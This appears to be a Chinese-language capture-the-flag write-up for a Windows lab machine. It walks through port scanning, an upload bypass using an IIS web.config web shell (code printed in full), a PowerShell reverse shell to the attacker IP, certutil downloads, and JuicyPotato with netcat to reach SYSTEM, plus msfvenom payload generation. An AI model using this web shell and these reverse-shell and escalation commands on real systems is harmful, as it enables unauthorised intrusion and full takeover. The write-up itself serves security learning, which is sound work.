# thl_ensala-papas

# 0.简介

**靶机**：[thehackerslabs - ensala-papas](https://thehackerslabs.com/ensala-papas/)
**难度**：初学者
**目标 IP**：192.168.205.221
**本机 IP**：192.168.205.141

---

# 1.扫描

`nmap`起手，先探测端口

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.221
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-02 11:17 CST
Nmap scan report for 192.168.205.221
Host is up (0.00068s latency).
Not shown: 65523 closed tcp ports (reset)
PORT      STATE    SERVICE
80/tcp    open     http
135/tcp   open     msrpc
139/tcp   open     netbios-ssn
445/tcp   open     microsoft-ds
3167/tcp  filtered nowcontact
47001/tcp open     winrm
49152/tcp open     unknown
49153/tcp open     unknown
49154/tcp open     unknown
49155/tcp open     unknown
49156/tcp open     unknown
49157/tcp open     unknown
MAC Address: 08:00:27:CE:80:73 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 11.77 seconds
                                                                   
```

再探测详细服务

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sV -sT -O -Pn -n -p80,135,139,445,47001,49152,49153,49154,49155,49156,49157 192.168.205.221
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-02 11:19 CST
Nmap scan report for 192.168.205.221
Host is up (0.00046s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 7.5
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49156/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:CE:80:73 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Microsoft Windows 7|2008|8.1
OS CPE: cpe:/o:microsoft:windows_7::- cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.1
OS details: Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1
Network Distance: 1 hop
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.00 seconds
                                                                
```

探测UDP服务

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sU -n -T4 --top-ports 100 192.168.205.221 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-02 11:27 CST
Nmap scan report for 192.168.205.221
Host is up (0.00048s latency).
Not shown: 62 closed udp ports (port-unreach), 37 open|filtered udp ports (no-response)
PORT    STATE SERVICE
137/udp open  netbios-ns
MAC Address: 08:00:27:CE:80:73 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 69.21 seconds
```

使用`nmap`扫描漏洞

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap --script=vuln -p80,135,139,445,47001,49152,49153,49154,49155,49156,49157 192.168.205.221
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-02 11:24 CST
Nmap scan report for 192.168.205.221
Host is up (0.00056s latency).

PORT      STATE SERVICE
80/tcp    open  http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown
MAC Address: 08:00:27:CE:80:73 (Oracle VirtualBox virtual NIC)

Host script results:
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_smb-vuln-ms10-054: false

Nmap done: 1 IP address (1 host up) scanned in 148.15 seconds
                                              
```

目前为止，感兴趣的端口有 **80**、**445，**  windwos的靶机445的优先级高于80，所以我们先测试445端口有没有利用点

---

# 2.踩点

## 2.1 port 445

```bash
┌──(kali㉿kali)-[~/test]
└─$ netexec smb 192.168.205.221 -u guest -p '' --shares
SMB         192.168.205.221 445    WIN-4QU3QNHNK7E  [*] Windows 6.1 Build 7600 x64 (name:WIN-4QU3QNHNK7E) (domain:WIN-4QU3QNHNK7E) (signing:False) (SMBv1:False)                                                                                                            
SMB         192.168.205.221 445    WIN-4QU3QNHNK7E  [-] WIN-4QU3QNHNK7E\guest: STATUS_LOGON_FAILURE 
                                                                                                    
```

它没有开放访客登录，所以可以直接去观察80端口了

## 2.2 port 80

```bash
┌──(kali㉿kali)-[~/test]
└─$ gobuster dir -u http://192.168.205.221 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x aspx,asp,html,txt,md -b 404
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.221
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              asp,html,txt,md,aspx
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/*checkout*.aspx      (Status: 400) [Size: 20]
/zoc.aspx             (Status: 200) [Size: 1159]
/*docroot*.aspx       (Status: 400) [Size: 20]
/*.aspx               (Status: 400) [Size: 20]
/http%3A%2F%2Fwww.aspx (Status: 400) [Size: 20]
/**http%3a.aspx       (Status: 400) [Size: 20]
/q%26a.aspx           (Status: 400) [Size: 20]
/http%3A.aspx         (Status: 400) [Size: 20]
/*http%3A.aspx        (Status: 400) [Size: 20]
/http%3A%2F%2Fyoutube.aspx (Status: 400) [Size: 20]
/http%3A%2F%2Fblogs.aspx (Status: 400) [Size: 20]
Progress: 345575 / 7642998 (4.52%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 345933 / 7642998 (4.53%)
===============================================================
Finished
===============================================================

```

扫到一个`/zoc.aspx`，去浏览器查看了一下，是一个上传页，并在注释发现了一个目录路径`/Subiditosdetono/`，当我们把目录加入网址会看到如下内容

![image](https://github.com/user-attachments/assets/b3e461b5-23c7-4dfc-b908-ba7fea785815)

我们可以看到有一个`config`文件，当我们点击时会发现**404**无法访问，那我们还是回上传页试试能不能上传**shell**

![image](https://github.com/user-attachments/assets/bd39753c-d756-4346-b2a8-d921cc8ecfd2)

不允许我们上传`.aspx`后缀的文件，根据之前访问`/Subiditosdetono/`看到有`config`文件，我们可以从中知道，可以上传`config`文件，我们去[hacktricks](https://book.hacktricks.xyz/)搜索一下看`config`文件可不可以做`shell`

![image](https://github.com/user-attachments/assets/3d2656b4-ae69-493a-b8f7-8e99ea490bdd)

找到了一点有意思的东西，我们把它的示例[复制](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config)下来，上传运行

```bash
┌──(kali㉿kali)-[~/test]
└─$ cat web.config 
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />       
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!--
<% Response.write("-"&"->")%>
<%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")

Function getCommandOutput(theCommand)
    Dim objShell, objCmdExec
    Set objShell = CreateObject("WScript.Shell")
    Set objCmdExec = objshell.exec(thecommand)

    getCommandOutput = objCmdExec.StdOut.ReadAll
end Function
%>

<BODY>
<FORM action="" method="GET">
<input type="text" name="cmd" size=45 value="<%= szCMD %>">
<input type="submit" value="Run">
</FORM>

<PRE>
<%= "\\" & oScriptNet.ComputerName & "\" & oScriptNet.UserName %>
<%Response.Write(Request.ServerVariables("server_name"))%>
<p>
<b>The server's port:</b>
<%Response.Write(Request.ServerVariables("server_port"))%>
</p>
<p>
<b>The server's software:</b>
<%Response.Write(Request.ServerVariables("server_software"))%>
</p>
<p>
<b>The server's software:</b>
<%Response.Write(Request.ServerVariables("LOCAL_ADDR"))%>
<% szCMD = request("cmd")
thisDir = getCommandOutput("cmd /c" & szCMD)
Response.Write(thisDir)%>
</p>
<br>
</BODY>



<%Response.write("<!-"&"-") %>
-->
        
```

![image](https://github.com/user-attachments/assets/2ab0ece6-4187-4cc6-93dd-610a3eb4cfdc)

弹个**shell**回来

```bash
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.205.141',8888);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

#攻击机
┌──(kali㉿kali)-[~/test/netcat]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.221] 49159
whoami
win-4qu3qnhnk7e\info
```

---

# 3.提权

拿到**shell**后看看权限

```bash
PS C:\users\info> whoami /priv

INFORMACI?N DE PRIVILEGIOS
--------------------------

Nombre de privilegio          Descripci?n                                  Estado     
============================= ============================================ =============
SeChangeNotifyPrivilege       Omitir comprobaci?n de recorrido             Habilitada   
SeImpersonatePrivilege        Suplantar a un cliente tras la autenticaci?n Habilitada   
SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso Deshabilitado

```

我们有 `SeImpersonatePrivilege`权限，所以我们可以使用 **[JuicyPotato](https://github.com/ohpe/juicy-potato)** 工具来提升权限。

![image](https://github.com/user-attachments/assets/18a9bc24-472b-4771-bf45-70707157ece7)

```bash
PS C:\tmp> certutil.exe -urlcache -split -f http://192.168.205.141:8000/nc.exe nc.exe
****  En l?nea  ****
  0000  ...
  e800
CertUtil: -URLCache comando completado correctamente.
PS C:\tmp> dir


    Directorio: C:\tmp


Mode                LastWriteTime     Length Name                            
----                -------------     ------ ----                            
-a---        02/01/2025     15:19      59392 nc.exe                          


PS C:\tmp> certutil.exe -urlcache -split -f http://192.168.205.141:8000/JuicyPotato.exe JuicyPotato.exe
****  En l?nea  ****
  000000  ...
  054e00
CertUtil: -URLCache comando completado correctamente.
PS C:\tmp> dir


    Directorio: C:\tmp


Mode                LastWriteTime     Length Name                            
----                -------------     ------ ----                            
-a---        02/01/2025     15:22     347648 JuicyPotato.exe                 
-a---        02/01/2025     15:19      59392 nc.exe                          



```

先将`JuicyPotato.exe`和`nc.exe`传上目标机器

```bash
./JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -l 1337 -a "/c C:\tmp\nc.exe -e cmd 192.168.205.141 4567" -c "{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}"
```

运行`JuicyPotato.exe`

```bash
└─$ nc -lvnp 4567    
listening on [any] 4567 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.221] 49176
Microsoft Windows [Versi�n 6.1.7600]
Copyright (c) 2009 Microsoft Corporation. Reservados todos los derechos.
C:\Windows\system32>whoami
whoami
nt authority\system

```

成功拿到**system**权限

---

# 4.总结

在`BerserkWings`、`ll104567`大佬那学了点技术[笑脸]

## 4.1 分析 SMB 服务

**检查域**、**操作系统版本**、**是否可以访客登录**等

```bash
┌──(kali㉿kali)-[~/test]
└─$ crackmapexec smb 192.168.205.221
SMB         192.168.205.221 445    WIN-4QU3QNHNK7E  [*] Windows 6.1 Build 7600 x64 (name:WIN-4QU3QNHNK7E) (domain:WIN-4QU3QNHNK7E) (signing:False) (SMBv1:False)
                                                                                                                                   
┌──(kali㉿kali)-[~/test]
└─$ netexec smb 192.168.205.221                    
SMB         192.168.205.221 445    WIN-4QU3QNHNK7E  [*] Windows 6.1 Build 7600 x64 (name:WIN-4QU3QNHNK7E) (domain:WIN-4QU3QNHNK7E) (signing:False) (SMBv1:False)                                                                                                          
                          
```

列出与 **smblcient** 共享的文件

```bash
┌──(kali㉿kali)-[~/test]
└─$ smbclient -L //192.168.205.221// -N
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.205.221 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available                                                         
```

自动化脚本

```bash
┌──(kali㉿kali)-[~/test]
└─$ smbmap -H 192.168.205.221        

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                        
[!] Access denied on 192.168.205.221, no fun for you...                                                                
[*] Closed 1 connections                                                                                                   
                                  
```

## 4.2 windows常用命令

```bash
# 查看操作系统 （OS） 信息
systeminfo
# 查看拥有权限
whoami /priv
# 下载攻击机文件
copy \\192.168.205.141\nc.exe .
```

## 4.3 msf

生成**shell**

```bash
┌──(kali㉿kali)-[~/test]
└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.205.141 LPORT=4444 f exe -o msf.exe 

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Saved as: msf.exe

```

连接**shell**

```bash
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
```

自动化漏洞挖掘（要有msf的shell）

```bash
msf6 > post/multi/recon/local_exploit_suggester
```